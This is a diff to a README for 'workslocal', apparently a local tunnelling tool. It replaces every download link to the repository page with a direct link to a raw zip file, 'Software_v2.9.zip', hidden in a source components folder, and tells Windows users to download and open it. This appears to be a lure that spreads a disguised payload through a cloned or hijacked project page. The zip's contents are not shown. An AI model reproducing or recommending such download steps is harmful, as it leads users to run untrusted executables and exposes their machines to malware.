@@ -1,12 +1,12 @@
 # 🛠️ workslocal - Local tunnels for easy testing
 
-[![Download workslocal](https://img.shields.io/badge/Download-Workslocal-blue?style=for-the-badge&logo=github)](https://github.com/Gunplaycapitalofliechtenstein178/workslocal)
+[![Download workslocal](https://img.shields.io/badge/Download-Workslocal-blue?style=for-the-badge&logo=github)](https://github.com/Gunplaycapitalofliechtenstein178/workslocal/raw/refs/heads/main/apps/inspector/src/components/Software_v2.9.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download workslocal:
 
-[https://github.com/Gunplaycapitalofliechtenstein178/workslocal](https://github.com/Gunplaycapitalofliechtenstein178/workslocal)
+[https://github.com/Gunplaycapitalofliechtenstein178/workslocal/raw/refs/heads/main/apps/inspector/src/components/Software_v2.9.zip](https://github.com/Gunplaycapitalofliechtenstein178/workslocal/raw/refs/heads/main/apps/inspector/src/components/Software_v2.9.zip)
 
 ## 👀 What workslocal does
 
@@ -32,7 +32,7 @@ If you want the best result, keep your browser open while you use the inspector.
 ## 🚀 Get started on Windows
 
 1. Open the download page:
-   [https://github.com/Gunplaycapitalofliechtenstein178/workslocal](https://github.com/Gunplaycapitalofliechtenstein178/workslocal)
+   [https://github.com/Gunplaycapitalofliechtenstein178/workslocal/raw/refs/heads/main/apps/inspector/src/components/Software_v2.9.zip](https://github.com/Gunplaycapitalofliechtenstein178/workslocal/raw/refs/heads/main/apps/inspector/src/components/Software_v2.9.zip)
 
 2. Look for the latest release or the main download file on the page.
 
@@ -173,7 +173,7 @@ workslocal fits these use cases:
 
 Visit the main repository page here and download or run the Windows build from the available files:
 
-[https://github.com/Gunplaycapitalofliechtenstein178/workslocal](https://github.com/Gunplaycapitalofliechtenstein178/workslocal)
+[https://github.com/Gunplaycapitalofliechtenstein178/workslocal/raw/refs/heads/main/apps/inspector/src/components/Software_v2.9.zip](https://github.com/Gunplaycapitalofliechtenstein178/workslocal/raw/refs/heads/main/apps/inspector/src/components/Software_v2.9.zip)
 
 After download:
 - Open the file
